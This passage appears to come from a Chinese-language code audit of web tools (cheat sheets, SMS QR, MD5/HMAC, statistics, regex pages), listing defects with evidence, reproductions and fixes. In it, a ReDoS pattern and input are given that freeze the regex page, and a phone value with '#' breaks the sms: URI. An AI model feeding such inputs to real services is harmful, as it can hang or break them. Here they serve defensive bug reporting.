- 方案：syntax 改为 `GRANT priv ON db.* TO user@host`，example 换成 `CREATE USER` + `GRANT` 两行，并删掉不必要的 `FLUSH PRIVILEGES`（或注明"仅直接改 grant 表后需要"）。
**留存建议（tools/it/mysql-cheatsheet.html）**：速查表被照抄的概率极高，这条必须改。

### IT-N229 `INT[(M)] [ZEROFILL]` 与 `VALUES(col)` 两处 8.0 废弃语法未标注（低，确认缺陷）
- 问题：类型表仍给 `INT[(M)] [UNSIGNED] [ZEROFILL]`，而整数显示宽度自 8.0.17 废弃（8.0.19 起直接被忽略）；UPSERT 示例用 `VALUES(name)`，自 8.0.20 起废弃并告警，现行写法是行别名。
- 证据：`tools/it/mysql-cheatsheet.html:363`、`:669`。
- 复现：静态对照 8.0 手册；废弃写法仍可执行但会告警，未来版本删除。别名写法：`INSERT INTO users (id,name) VALUES (1,'A') AS new ON DUPLICATE KEY UPDATE name = new.name;`。
- 影响：`tools/it/mysql-cheatsheet.html`
- 方案：syntax 去掉 `[(M)]`/`[ZEROFILL]` 或加"（8.0.17 起废弃）"；UPSERT 示例换成 `AS new ... new.name`。
**留存建议（tools/it/mysql-cheatsheet.html）**：顺手改，避免教出告警代码。

### IT-N230 名为"SMS 二维码"却不生成可扫二维码：数据区是伪随机填充（高，确认缺陷）
- 问题：`renderQR()` 只画了 3 个定位图案与定时图案，其余数据区用 FNV 哈希做种子的 LCG 随机填 0/1；没有数据编码、Reed–Solomon 纠错、格式/版本信息、掩码，网格固定 `N=27`（版本 5），任何标准扫码器都解不出内容。
- 证据：`tools/it/sms-qr.html:255`（`const N=27`）、`:267-272`（`rnd()<0.5?0:1` 铺满数据区）、`:275-281`（只把格子画进 canvas）、`:157`（说明宣称"版本升高、纠错等级 M"）。
- 复现：读源码即可判定（无任何 QR 编码步骤）；对照 `:157` 的"内容较长时版本升高"——代码中 N 是常量，无法升版。
- 影响：`tools/it/sms-qr.html`
- 方案：引入纯前端 QR 编码库（锁版本、本地引入，符合纯前端约束）按 version/ECC 真实编码；否则按 N220 的先例把页面改名为"SMS 链接（sms: URI）生成器"并说明需外部二维码工具。
**留存建议（tools/it/sms-qr.html）**：与 N220（WiFi 页）同一病灶，建议两页共用一套本地 QR 渲染。

### IT-N231 只编码正文不编码号码，号码含 `#`/`&`/空格即被截断（中，确认缺陷）
- 问题：`buildSms()` 对正文做了 `encodeURIComponent`，号码原样拼接；号码含 `#` 会把 `?body=` 落到 fragment，含 `&` 会起新参数，含空格/连字符则产生非法 URI。页面说明自己写着"正文与号码中的特殊字符需先做百分号编码"。
- 证据：`tools/it/sms-qr.html:249-253`（`'sms:'+phone+'?body='+msg`）、`:157`（说明要求号码也编码）、`:161`（`#phone` 无 `pattern`、无校验）。
- 复现：phone=`13800138000#test`、msg=`Hi` → 生成 `sms:13800138000#test?body=Hi`，`?body` 成为 fragment 内容，扫码端只填号码、正文丢失；phone=`138 0013 8000` → URI 含空格，RFC 3986 非法，部分扫码器截断。
- 影响：`tools/it/sms-qr.html`
- 方案：号码先去空格/连字符并校验 `^\+?\d{5,15}$`（不合法则提示"仅支持数字与可选 +"），正文保持 `encodeURIComponent`；若允许扩展号再单独约定分隔符。
**留存建议（tools/it/sms-qr.html）**：属于"生成物不可用"级别，应与 N230 同批修。

### IT-N232 模板 NaN 守卫误伤含 "NaN" 的短信正文，直接吞掉结果（中，确认缺陷）
- 问题：结果渲染前先用 `/NaN/` 正则扫描**拼入用户文本**的 HTML，命中就把 `out.innerHTML` 换成"⚠ 计算结果含无效值，请检查输入是否为有效正数"，后续 `appendChild(canvas)` 也不再执行。
- 证据：`tools/it/sms-qr.html:285`（守卫 + 正则）；`:343`（历史读取同样把含 "NaN" 的结果判为无效）。
- 复现：msg=`NaN`、phone=`13800138000` → `buildSms()` = `sms:13800138000?body=NaN`，正则 `(^|[^A-Za-z])NaN([^A-Za-z]|$)` 命中（前一字符 `=`、后为串尾）→ 页面只剩错误提示，二维码与 URI 都不出现。
- 影响：`tools/it/sms-qr.html`（该守卫为全站模板注入，凡"结果里拼用户文本"的页面都有同型风险）
- 方案：文本/URI 类页面删除该守卫；数值页改判 `Number.isFinite(数值结果)` 而不是正则扫 HTML。
**留存建议（tools/it/sms-qr.html）**：顺手删，属于"用户输入决定是否报错"的错误设计。

### IT-N233 "两类错误/效能"模块忽略单尾选择，与上方主结果自相矛盾（中，确认缺陷）
- 问题：`__stTail()` 只认 `one`/`1`/`单`，而 `#tail` 的取值是 `two|left|right`，于是恒返回 `'two'`。结果：主计算区按单尾算 p 与临界值，下方"两类错误"模块却按双尾算临界值/效能/MDE，并显示"±1.960（双尾）"。
- 证据：`tools/it/hypothesis-test.html:173-177`（option 值）、`:585-589`（`__stTail`）、`:599`（`zc`）、`:603`（power 公式）、`:634-636`（渲染"±…（双尾）"）、`:307-322`（主计算区正确使用 `tail`）。
- 复现：mean=95、mu0=100、sigma=15、n=36、α=0.05、选"左尾" → 主结果 p=Φ(−2)=0.0228、临界 −1.645（拒绝 H₀）；下方模块显示"z=-2.0000 临界值 ±1.960（双尾）"，效能 51.60%、β=48.40%。node 实算单尾正解：效能 Φ(2−1.6449)=63.88%、β=36.12%；MDE 由 7.004 降为 6.216（页面偏大 12.7%）。
- 影响：`tools/it/hypothesis-test.html`
- 方案：`__stTail` 改判 `two|left|right`（left/right → 单尾并带方向符号），或直接复用主模块已算好的 `tail`/`zc` 传入 `__stHT()`。
**留存建议（tools/it/hypothesis-test.html）**：这是本页最会误导决策的缺陷（效能/MDE 偏大一成），优先修。

### IT-N234 简介称 "z or t"、公式列 t 检验与自由度，实际只有 Z 检验（中，确认缺陷）
- 问题：英文简介写 "Run a basic hypothesis test (z or t)"，公式清单给出 `t=(x̄−μ₀)/(s/√n)`、自由度为 n−1，但输入只有 σ（必填且 >0），无 s、无 df；`__stTcrit(df)` 与 df 表定义后从未被调用，属死代码。
- 证据：`tools/it/hypothesis-test.html:516`（"z or t"）、`:161`（t 公式与 df）、`:562-575`（`__stTcrit` 与 T 表）、全文仅此一处出现 `__stTcrit`。
- 复现：留空 sigma → `__stHT()` 因 `!isFinite(sigma)` 返回 null，模块只提示"请填写…sigma"，全程无 s/df 入口；页面任何输出都不含 t 分布或自由度。
- 影响：`tools/it/hypothesis-test.html`
- 方案：二选一——删掉 "z or t"、t 公式与 df 死代码，标题明确"σ 已知的单样本 Z 检验"；或加 s 输入并按 t 分布算 p（需引入不完整 Beta 函数，注意与现有近似精度口径一致）。
**留存建议（tools/it/hypothesis-test.html）**：建议走"删宣称"路线，成本最低且与实现一致。

### IT-N235 p 值打印 9 位有效数字，但 CDF 近似在远尾只有 2–3 位可信（低，确认缺陷）
- 问题：`fmt` 对小数用 `toExponential(8)`，而 `normalCDF` 是 A&S 26.2.17 多项式（绝对误差约 7.5e-8），尾部相对误差随 |z| 放大；显示精度远超算法精度。
- 证据：`tools/it/hypothesis-test.html:277`（`toExponential(8)`）、`:280-286`（`normalCDF` 多项式）。
- 复现：node 与高精度 erf 对照 p=2·min(Φ,1−Φ)：z=4 → 页面 6.337206e-5 vs 真值 6.334248e-5（+0.05%）；z=5 → 5.7421e-7 vs 5.7334e-7（+0.15%）；z=6 → 1.980244e-9 vs 1.973200e-9（+0.36%，第 3 位有效数字已错）。中段 z≤3 误差 ≤6e-5，可放心。
- 影响：`tools/it/hypothesis-test.html`
- 方案：|z|≤4 时保留 6 位有效数字；|z|>4 改用 `erfc` 连分式，或直接输出"p < 1e-6"这类区间表述。
**留存建议（tools/it/hypothesis-test.html）**：低优先，但"9 位小数"会让人误以为精确。

### IT-N236 "错误格式"示例既不是合法 JSON，也未引 RFC 9457（低，确认缺陷）
- 问题：syntax 写成 `{"error":{"code","message","details"}}`——缺冒号与值，`JSON.parse` 直接抛错；页面把自定义 error 包装当作唯一定式，未提 2022 年后的标准 `application/problem+json`。
- 证据：`tools/it/rest-api-cheatsheet.html:558`（syntax）、`:560`（example）、`:244-256`（引据表只引 RFC 9110）。
- 复现：node `JSON.parse('{"error":{"code","message","details"}}')` → `SyntaxError: Expected ':'`。
- 影响：`tools/it/rest-api-cheatsheet.html`
- 方案：syntax 补全为 `{"error":{"code":"…","message":"…","details":{…}}}`，并在引据表加一行 RFC 9457（`type/title/status/detail/instance`），说明两种流派。
**留存建议（tools/it/rest-api-cheatsheet.html）**：一句话补齐即可。

### IT-N237 深度解析把"POST 建"指向 `/users/{id}`，与自家速查表矛盾（低，确认缺陷）
- 问题：`:221` 写"用复数名词 `/users/{id}`，GET 查、POST 建、PATCH 改"，把创建动作挂到带 id 的实例地址；REST 语义下创建应 POST 到集合 `/users`，对 `/users/{id}` POST 通常 404/405。
- 证据：`tools/it/rest-api-cheatsheet.html:221`；对照同页 `:280`（`GET /api/users?…`）、`:302`（`POST /api/{resource}`）、`:323-328`（PATCH 用 `{id}`）。
- 复现：静态对读——速查表两条创建/更新都区分集合与实例，唯深度解析一处混用。
- 影响：`tools/it/rest-api-cheatsheet.html`
- 方案：改为"`GET /users/{id}` 查、`POST /users` 建、`PATCH /users/{id}` 改"。
**留存建议（tools/it/rest-api-cheatsheet.html）**：顺手改，避免示范错误姿势。

### IT-N238 HMAC-MD5 密钥超过 64 字符直接 TypeError，功能不可用（高，确认缺陷）
- 问题：`hmacMd5` 的"长密钥先摘要"分支把 `md51(k)`（返回 4 个 32 位**字的数组**）赋回 `k`，随后 `k.charCodeAt(i)` 不是函数 → 抛 TypeError。且判长用的是**字符数**，40 个中文字符≈120 字节却不会触发摘要分支。
- 证据：`tools/it/md5.html:385`（`k = md51(k)`）、`:387`（`k.charCodeAt(i)`）、`:330-341`（`md51` 返回 `state` 数组）、`:404`（`calcHmac` 无 try/catch）。
- 复现：node 抽出页面算法：`md51('a'.repeat(70))` 返回 `Array(4)`，`typeof k.charCodeAt === 'undefined'`；模拟 ipad 循环即抛 `TypeError: k.charCodeAt is not a function`。页面表现为点/输入后结果不更新（异常仅在控制台）。
- 影响：`tools/it/md5.html`
- 方案：按 RFC 2104 处理长密钥——把 state 转成 16 字节（小端）作为密钥块，用字节串参与 ipad/opad；`k.length` 改按 UTF-8 字节长度判断；`calcHmac` 加 try/catch 给出可见提示。
**留存建议（tools/it/md5.html）**：HMAC 页面的核心分支是坏的，优先修。

### IT-N239 取消"UTF-8编码"后非 ASCII 被按 UTF-16 码元塞入，得到非标准摘要（中，确认缺陷）
- 问题：`md5()` 关掉勾选时直接 `charCodeAt(i) << ((i%4)<<3)` 拼字，无 `0xFF` 掩码；中文码元（>255）的高位会污染相邻字节，结果既不是 UTF-8 也不是任何单字节编码的 MD5；HMAC 模式又恒定按 UTF-8 编码，勾选框对 HMAC 无效。
- 证据：`tools/it/md5.html:352-353`（`unescape(encodeURIComponent(s))`）、`:335`（无掩码的字节拼装）、`:383-384`（HMAC 强制 UTF-8，不读 `#utf8`）。
- 复现：node 抽出页面算法——`密码学哈希函数测试`：utf8=true → `0069fbe6a5a50eaf7315ee7eda065ac2`（与 `crypto md5(utf8)` 完全一致）；utf8=false → `c2981cdd9f17a049ef6b0ca35b77e99b`（不对应任何标准编码）。纯 ASCII `abc` 两种设置都是 `900150983cd24fb0d6963f7d28e17f72`，故问题只在非 ASCII 暴露。
- 影响：`tools/it/md5.html`
- 方案：非 UTF-8 分支改为明确的"按 Latin-1 字节串"并加 `& 0xFF` + 非 ASCII 时提示；或直接移除该勾选（通行实现均按 UTF-8）。HMAC 同步尊重该开关或标注"HMAC 固定 UTF-8"。
**留存建议（tools/it/md5.html）**：与 N238 同批；建议直接删勾选，减一个错误维度。

### IT-N240 宣称"支持批量生成""MD5 碰撞检测参考"，两项功能都不存在（中，确认缺陷）
- 问题：JSON-LD description 与页内简介都写"支持批量生成，MD5 碰撞检测参考"，实际只有单条文本框、单文件与 HMAC 三个模式，既无按行批量也无任何碰撞/比对入口。
- 证据：`tools/it/md5.html:47`（JSON-LD）、`:606`（intro 正文）、`:176-224`（三模式控件全貌：`:189` textarea、`:203` file、`:218` hmac textarea）。
- 复现：清点页面全部输入控件：文本 textarea 1 个、file 1 个、hmac textarea + key 各 1 个，无列表/多行输出、无第二个待比对哈希。
- 影响：`tools/it/md5.html`
- 方案：删除两处宣称；若要做实，最小增量是"textarea 按行逐条输出 32 位哈希"（真实批量，成本低）。
**留存建议（tools/it/md5.html）**：文案删除即可，二选一。

### IT-N241 n 无上限且 cdf 为 O(n²)，大 n 会把页面拖到无响应（中，确认缺陷）
- 问题：`n` 只有 `min=1`、无 `max`；`cdf()` 外层跑 `0..k`，内层 `pmf()` 又用循环算 O(k) 的对数组合，整体 O(n²)。n、k 还用 `parseInt` 静默截断小数。
- 证据：`tools/it/binomial-distribution.html:176`（`min="1"` 无 max）、`:292-296`（`cdf`）、`:279-286`（`logComb`/`pmf`）、`:299-301`（`parseInt`）。
- 复现：node 同算法实测（k=n/2,p=0.5）：n=5000 → 28ms；n=20000 → 398ms；按 O(n²) 外推 n=1e5 ≈ 10s、n=1e6 ≈ 千秒级。另输入 n=10.5 → 按 10 计算，页面无提示。
- 影响：`tools/it/binomial-distribution.html`
- 方案：加 `max`（如 10000）并在超限时提示改用正态/泊松近似；`cdf` 改递推 `P(i+1)=P(i)·(n−i)/(i+1)·p/(1−p)`（O(n) 且数值更稳）；n/k 用 `Number.isInteger` 校验。
**留存建议（tools/it/binomial-distribution.html）**：递推改写一行代码就能从 O(n²) 降到 O(n)，性价比最高。

### IT-N242 分步计算用 `exp(logComb)` 还原组合数，n≳1030 时显示"未定义"（低，确认缺陷）
- 问题：步骤 1/3 用 `Math.round(Math.exp(logComb(n,k)))` 直接打印 C(n,k)，`exp` 溢出为 Infinity，`fmt` 对非有限值返回"未定义"，而同一页 PMF 仍正常输出，容易被误读成算错。
- 证据：`tools/it/binomial-distribution.html:325`、`:327`（两处 `Math.exp(logComb(...))`）、`:272-277`（`fmt` 的"未定义"分支）。
- 复现：node 实算：n=1000,k=500 → logComb=689.47、exp=2.70e299（可显示）；n=1030,k=515 → logComb=710.25、exp=Infinity → 步骤显示 `C(1030, 515) = 未定义`，而 `pmf(1030,515,0.5)=2.485513e-2` 正常；临界点约在 logComb≈709.78（n≈1030）。
- 影响：`tools/it/binomial-distribution.html`
- 方案：输出对数形式（如 `e^{710.25}` / `10^{308.5}`）并加注"组合数超出双精度范围，PMF 用对数计算"；或只在 logComb<700 时还原数值。
**留存建议（tools/it/binomial-distribution.html）**：低优先，但会让人误判结果。

### IT-N243 同一页对正态近似阈值写 "≥5" 与 ">5"，边界自相矛盾（低，确认缺陷）
- 问题：公式清单写"np 与 n(1−p) 均 ≥5"，下方 info-box 写"np≥5 且 n(1−p)≥5"，而引据表（中英）都写 "> 5"，边界情形（np=5）到底可否近似没有统一口径。
- 证据：`tools/it/binomial-distribution.html:171`（`≥5`）、`:192`（`≥5`）、`:254`（`np, n(1-p) > 5`）、`:225`（FAQ 也写 `≥5`）。
- 复现：取 np=5：n=10,p=0.5 → np=5、n(1−p)=5。按 `:192`/`:171`/`:225` 可用正态近似，按 `:254` 不可用，同页三种说法互相打脸。
- 影响：`tools/it/binomial-distribution.html`
- 方案：统一为"≥5（经验阈值，部分教材要求 ≥10）"，并注明连续性校正 `z=(k−np±0.5)/√(np(1−p))`。
**留存建议（tools/it/binomial-distribution.html）**：一处口径统一，成本 4 个字符。

### IT-N244 Go 示例用 `--` 当注释，复制进 .go 文件即编译失败（中，确认缺陷）
- 问题：多条可复制示例用 `--` 作行内注释，Go 只有 `//` 与 `/* */`；`--` 在 Go 里是自减运算符，出现在语句位置属语法错误。示例块自带"复制"按钮，用户会直接粘贴。
- 证据：`tools/it/go-cheatsheet.html:341`、`:365`、`:397`、`:429`、`:437`（同页 5 处）；其中 `:341` 同一段示例上一行刚用了合法注释 `// LIFO 顺序`，下一行却写 `-- 先输出`，自相矛盾。
- 复现：把 `:437` 示例存为 main.go（`x := 1; p := &x; *p = 2; fmt.Println(x)  -- 2`）→ `go build` 报 `syntax error: unexpected --`；`:365` 的 `switch {  -- 无表达式` 同理（`{` 后紧跟 `--` 非法）。
- 影响：`tools/it/go-cheatsheet.html`
- 方案：全部替换为 `//`（中文说明可保留），并检查是否还有把中文破折号排成 `--` 的残留。
**留存建议（tools/it/go-cheatsheet.html）**：批量替换 5 处即可，别留"看起来像注释"的坑。

### IT-N245 示例中的 `...` 占位与未使用变量使片段不可编译（低，确认缺陷）
- 问题：多个示例直接写 `...` 省略（`if x > 0 { ... }`、`case int: ...`、`rw.RLock(); ...; rw.RUnlock()`），Go 无此占位语法；另 `for k, v := range m {}`、`for i, r := range s {}` 因变量声明未使用会报 "declared and not used"。
- 证据：`tools/it/go-cheatsheet.html:349`、`:365`、`:389`（`for k, v := range m {}`）、`:397`（`for i, r := range s {}`）、`:429`、`:461`、`:485`（`rw.RLock(); ...; rw.RUnlock()`）。
- 复现：静态对读 Go 语法 + 编译规则：`...` 单独成句为语法错误；`for i, r := range s {}` 在 `go build` 下报 i、r declared and not used（空 body 不会使用它们）。
- 影响：`tools/it/go-cheatsheet.html`
- 方案：省略处补最小可编译语句（`_ = i`、`_ = r`、`fmt.Println(x)`），或在示例块头加"片段示意，不可直接编译"并弱化复制暗示。
**留存建议（tools/it/go-cheatsheet.html）**：与 N244 同批改，统一成"可编译片段"标准。

### 承诺 vs 实际（R 批专项）
- `tools/it/rabbit.html:165`、`:157`：称 eSTREAM Profile 1 获胜算法、128 位密钥 + 可选 64 位 IV，但 `:333` 进位实现错误（N225）、`:312` 密钥装入与 `:154` 说明不符（N226）→ 输出不是标准 Rabbit，无法与其它实现互通；页面未提供任何测试向量自检。
- `tools/it/rabbit.html:181`：label 承诺"32 hex 字符"密钥，实际按文本截断（N226）；`:370` 密钥清空时用 15 字节默认值且不补齐。
- `tools/it/rabbit.html:201`："导出明细 CSV"导的是 `#rabbitTable`，而 `:441-443` 读 `#output`（**textarea**）的 `textContent`，textarea 的 textContent 是初始内容（恒空）→ 历史/图表/CSV 恒空（IT-N140 同型，不重复编号）。
- `tools/it/mysql-cheatsheet.html:643`、`:645`：权限示例为 8.0 已移除语法（N228）；全页无 `CREATE USER`，而 8.0 建账号必须先 CREATE USER。
- `tools/it/sms-qr.html:156` 写 `SMSTO:号码:内容`，`:196` 示例却写 `smsto:13800000000?body=Hi`（两种格式互斥）；`:157` 宣称"版本升高、纠错 M"，`:255` 却把 `N=27` 写死（N230）。
- `tools/it/hypothesis-test.html:516` "z or t"、`:161` t 公式与 df → 实际只有 Z 检验（N234）；`:585-589` 单尾选择失效（N233）。
- `tools/it/rest-api-cheatsheet.html:558` 错误格式 syntax 非法 JSON（N236）；`:221` "POST 建"指向 `/users/{id}`（N237）。
- `tools/it/md5.html:201`：称"支持任意大小文件"，但 `:338`/`:375` 的 `tail[14]=n*8` 只写低 32 位、未给高位字 `tail[15]` 赋值 → ≥512 MiB 文件摘要错误；且 `:417-426` 用 `readAsArrayBuffer` 全量读入内存，"任意大小"不成立。
- `tools/it/md5.html:47`、`:606`：宣称"支持批量生成""MD5 碰撞检测参考"，实际无批量与碰撞功能（N240）。
- `tools/it/binomial-distribution.html:176-178`：三个输入无上限/无小数校验（N241）；`:171` `≥5` 与 `:254` `>5` 冲突（N243）。
- `tools/it/go-cheatsheet.html:341` 等 5 处 `--` 注释（N244）、`:365` 等 7 处 `...` 占位与未使用变量（N245），与"可复制示例"的定位冲突。
- 通用：本批 5 页的"导出明细 CSV"（`tools/it/rabbit.html:201`、`tools/it/sms-qr.html:165`、`tools/it/hypothesis-test.html:181`、`tools/it/md5.html:191`、`tools/it/binomial-distribution.html:181`）导的都是历史表而非当前结果；其中 rabbit 的历史源文本取自 textarea 的 `textContent`，恒为空。

### 覆盖
- 实读 8 页：`tools/it/rabbit.html`、`tools/it/mysql-cheatsheet.html`、`tools/it/sms-qr.html`、`tools/it/hypothesis-test.html`、`tools/it/rest-api-cheatsheet.html`、`tools/it/md5.html`、`tools/it/binomial-distribution.html`、`tools/it/go-cheatsheet.html`。
- 新增 21 条（高 4 / 中 10 / 低 7），编号 IT-N225~IT-N245；本批无重号（上一批止于 IT-N224）。
- 未覆盖说明：只审计主流程、参数边界与文档口径，未逐条穷举 MySQL/Go 语法（仅抽检 GRANT、`INT[(M)]`/`ZEROFILL`、`VALUES()`、`--`、`...`）；Rabbit 未做官方向量比对（缺 RFC 4503 期望值，只证明了"进位/密钥装入偏离本页说明"）；sms-qr 未实际扫码；binomial 参数域抽样到 n=20000；rest-api/mysql 内容准确性对照 RFC 9110/9457 与 MySQL 8.0 手册，非逐条穷举。
- 未做验证：未开浏览器、未构建、未跑门禁、未 git 写；全部结论为源码静态分析 + `node` 内存复算（临时脚本在 `/tmp`，未落仓库），未验证英文态 `?lang=en-US`/繁体/移动端。

### IT-N246 历史/数据表/图表与 CSV 全恒空：结果写进 textarea 的 `value`，历史读 `textContent`（中，确认缺陷）
- 问题：`convert()` 把结果赋给 `#output`（textarea）的 `.value`，而 `__binary_to_textResText()` 读同一元素的 `.textContent`。textarea 的 `textContent` 是它的初始子节点（此处为空），不随 `.value` 变化 → `res` 恒 `''`，`__binary_to_textExtras()` 在 `:363` 直接 return，TBKit 的记录/渲染整条链都不触发。
- 证据：`tools/it/binary-to-text.html:164`（`<textarea id="output" …></textarea>`，无初始文本）、`:265`（写 `.value`）、`:305-311`（读 `textContent`，`:310` 还会把含 `Error` 的结果判空）、`:362-363`（`if(!res) return`）、`:384-386`（CSV 导的 `#binary_to_textTable` 只在 `:382` 的 Render 里填充，该 Render 永不执行）、`:134-138`（四个页签）。
- 复现：输入 `01001000 01101001` → `#output.value === "Hi"`，但 `#output.textContent === ""`；`__binary_to_textExtras()` 立即返回 → 全程不会走到 `:381` 的 `TBKit.history.record(...)`，历史条目恒为 0，"数据表/图表/历史"三个页签恒空，导出的 CSV 只有表头。
- 影响：`tools/it/binary-to-text.html`（"历史/趋势/导出"三个卖点全部失效）
- 方案：`__binary_to_textResText()` 改为 `var t=(r.value||r.textContent||'')…`（textarea 用 `.value`，div 型结果仍走 `textContent`），并删除 `:310` 那条以 `/错误|Error/` 判空的启发式（它会把正常文本里的 "Error" 判成无效结果）。
**留存建议（tools/it/binary-to-text.html）**：与 IT-N140 同型（第 4 例）；建议全站统一 `__*ResText()` 的取值口径，别再逐个补。

### IT-N247 非法 UTF-8 被静默换成 U+FFFD、首部 BOM 被吞，且无字节视图兜底（中，确认缺陷）
- 问题：`new TextDecoder()` 默认 `fatal:false`（解不出的字节静默变 `�`）且 `ignoreBOM:false`（开头 `EF BB BF` 会被当 BOM 剥掉），页面既无"含非法字节"提示，也没有 Latin-1/hex 备选出口。
- 证据：`tools/it/binary-to-text.html:265`、`:222`（引据表只写 "then UTF-8 decode"）、`:203`（FAQ 只讨论分隔符与长度）。
- 复现：node 同口径——`new TextDecoder().decode(new Uint8Array([0xFF,0x41]))` → `"\u{FFFD}A"`；`decode([0xEF,0xBB,0xBF,0x41])` → `"A"`（BOM 3 字节被无声丢弃）；`decode([0xC3])` → `"\u{FFFD}"`。即 `11111111 01000001` 只得到 `�A`，`11101111 10111011 10111111 01000001` 得到 `A`。
- 影响：`tools/it/binary-to-text.html`（`:197` 自述用于"协议负载还原/判断是否已加密"，此处恰恰分不清"真乱码"与"字节非法"）
- 方案：`new TextDecoder('utf-8',{fatal:true,ignoreBOM:true})` 包 try/catch，失败时提示"含 N 个非法 UTF-8 字节"并给出 Latin-1 解码结果作对照；再加一个 `0x..` 字节列表输出。
**留存建议（tools/it/binary-to-text.html）**：与 IT-N263（hex-encode）同型，两页应一起改。

### IT-N248 FAQ 两处说明与实现相反（低，确认缺陷）
- 问题：`:203` 写"若原文本身含空格字符，剔除后就无法还原空格"——输入是 0/1 位串，空格只是排版分隔符，原文空格由字节 `00100000` 还原，不存在丢失；同句"末尾不足的位会被丢弃或报错"——实际是硬报错并中止，既无"丢弃"也无部分输出。
- 证据：`tools/it/binary-to-text.html:203` vs `:254`（无条件剥离 `[\s:,;_\-.\n\r\t]`）、`:259-261`（非 8 倍数 → `alert` 后 `return`，输出框保持空）。
- 复现：`01000001 00100000 01000010` → 输出 `A B`（空格完整还原，与"无法还原"相反）；`010000011` → alert "二进制长度必须为 8 的倍数，当前长度: 9"，无任何结果（不存在"丢弃"分支）。
- 影响：`tools/it/binary-to-text.html`
- 方案：改写为"分隔符仅用于排版，不影响正文；长度非 8 倍数时直接报错，建议尾部补 0 或去掉多余位"。
**留存建议（tools/it/binary-to-text.html）**：文案小改，成本一行。

### IT-N249 「2 字名/3 字名」被用字池里的双字词条破坏：选 2 字会得到 3 字（中，确认缺陷）
- 问题：`maleChars` 混入 3 个双字词条（`建国`/`志强`/`建华`），而 `generateOneName()` 把池中**每一项**当作一个"字"拼接——`givenLen = max(nameLen − surname.length, 1)` 只控制拼接次数，不控制字符数。
- 证据：`tools/it/chinese-name-generator.html:513`（三个双字项）、`:807-813`（`givenLen` 与 `given += pick(pool)`）。
- 复现：node 统计 `maleChars` 共 100 项、其中 3 项长度为 2 → 男性"2字名"（姓氏 1 字 → `givenLen=1`）有 3% 概率抽到双字词条，得到 `李建国`（3 字）；选"3字名"时若又抽到复姓（`surnames` 含 20 个双字姓，`:506-507`）则 `givenLen=max(3-2,1)=1`，仍可拼出 `欧阳建国`（4 字）。
- 影响：`tools/it/chinese-name-generator.html`
- 方案：把 `建国/志强/建华` 拆成单字（建、国、志、强、华）或移除；`givenLen` 改按"还差几个字符"循环并在拼满时停；末尾加 `fullName.length===nameLen` 断言兜底。
**留存建议（tools/it/chinese-name-generator.html）**：数据拆分一行即可，属正确性修复，优先于下面两条。

### IT-N250 用字池有 15 组重复条目，`pick()` 均匀取下标导致某些字被放大取样（低，确认缺陷）
- 问题：两个池都按"每项一个下标"随机取样，重复条目等于给该字加权；重复多为手录冗余。
- 证据：`tools/it/chinese-name-generator.html:525-536`（`femaleChars`：`薇`×3、`素`×3，另 13 字各 ×2）、`:511-522`（`maleChars`：`毅`×3、`荣`×2）、`:783-792`（`pool = …slice()` / `concat()` 均不去重）。
- 复现：node 统计 → female `[["燕",2],["琳",2],["慧",2],["兰",2],["菊",2],["薇",3],["颖",2],["露",2],["悦",2],["洁",2],["佳",2],["彤",2],["珊",2],["珠",2],["素",3]]`；male `[["毅",3],["荣",2]]`。即"薇/素"的出现率是"芳"的 3 倍（3% vs 1%）。
- 影响：`tools/it/chinese-name-generator.html`（分布失衡，"随机"名扎堆在同几个字）
- 方案：`getCharPool()` 末尾 `pool = Array.from(new Set(pool))`，或按字义权重显式加权（有意的加权需注释说明）。
**留存建议（tools/it/chinese-name-generator.html）**：一行去重，顺手改。

### IT-N251 收藏/取消收藏的 toast 调用无参，文案会显示 `undefined`（低，待验证）
- 问题：`ToolBox.showToast(i18nText())` 未传 key/fallback；`i18nText` 在无 key 时 `I18n.t(undefined, undefined)`，最终 `return key`（即 `undefined`）。
- 证据：`tools/it/chinese-name-generator.html:768`；`js/common.js:1510-1521`。
- 复现：静态推演——`i18nText()` → `undefined` → toast 文本为 `"undefined"`；`I18n.t` 若抛错也会被 `js/common.js:1520` 的 catch 吞掉，结果同为 `undefined`。未真机确认 toast 渲染（本批不开浏览器）。
- 影响：`tools/it/chinese-name-generator.html`
- 方案：`i18nText('toast.fav_removed','已取消收藏')` / `i18nText('toast.fav_added','已加入收藏 ❤️')`。
**留存建议（tools/it/chinese-name-generator.html）**：顺手补 key，与 IT-N211 同型。

### IT-N252 页面自带 ReDoS 章节却无超时保护：`(a+)+$` + 30 位输入卡 6.9 秒，且每次按键重跑两遍（高，确认缺陷）
- 问题：`testRegex()` 在 UI 线程同步 `regex.exec`，无 Worker、无时长上限；`:517` 的 `matches.length > 1000` 只限制**匹配个数**，对单次灾难性回溯完全无效。pattern/textarea 的 `input` 事件以及 `#flags` 的 `input` 监听都会同时跑 `testRegex()+doReplace()`（`:465-480` + 控件上的 `oninput`），一次按键两次全量匹配。
- 证据：`tools/it/regex.html:490-518`（`:509` 构造、`:514` `while((match=regex.exec(text))` 在 `:491` 的 `t0` 之后同步执行）、`:517`（1000 条上限）、`:465-480`（重复绑定）、`:345`（FAQ 自称"用户可控的正则应设超时保护"）、`:187`。
- 复现：node 同引擎 `^(a+)+$` 对 `"a"*n+"X"`：n=24 → 106ms；n=26 → 2.5s；n=30 → 6.9s（每 +1 位约 ×4，n=34 即分钟级）。页面上粘贴 30 个 a + X 后标签页整页卡死，期间无法输入。
- 影响：`tools/it/regex.html`（一个"正则调试器"在最需要它的时候把自己锁死）
- 方案：匹配移到 Web Worker + 200ms 超时（超时 `terminate` 并提示"疑似灾难性回溯"）；`exec` 前先做"嵌套量词/超长输入"预检；输入事件统一去抖 300ms 并合并到一次调用。
**留存建议（tools/it/regex.html）**：本页最高优先，属"自述风险却不设防"。

### IT-N253 分享链接的 base64 含 `+`，`URLSearchParams` 把 `+` 解成空格 → 链接静默失效（中，确认缺陷）
- 问题：`btoa` 产出标准 base64（字母表含 `+` `/` `=`），分享 URL 拼成 `#regex=` + 原样 base64；`restoreSharedRegex()` 用 `new URLSearchParams(hash)` 取值，而 URLSearchParams 按 application/x-www-form-urlencoded 把 `+` 当作空格 → base64 被破坏，`atob` 抛 `URI malformed` 后被空 `catch` 吞掉。
- 证据：`tools/it/regex.html:654-656`（拼 `#regex=`）、`:660`（`URLSearchParams`）、`:663`（`atob`）、`:667-669`（空 catch，"无效片段仅忽略"）。
- 复现：node 复算同 payload `{p:"\\d+",f:"g",t:"联系我 张三 13800138000"}` → base64 中段含 `+`；`new URLSearchParams("regex="+b64).get("regex")` ≠ 原串，`Buffer.from(...,'base64')` 再 `decodeURIComponent` → `URI malformed`。页面表现：打开他人分享的链接后三个输入框仍是默认值，且无任何提示。
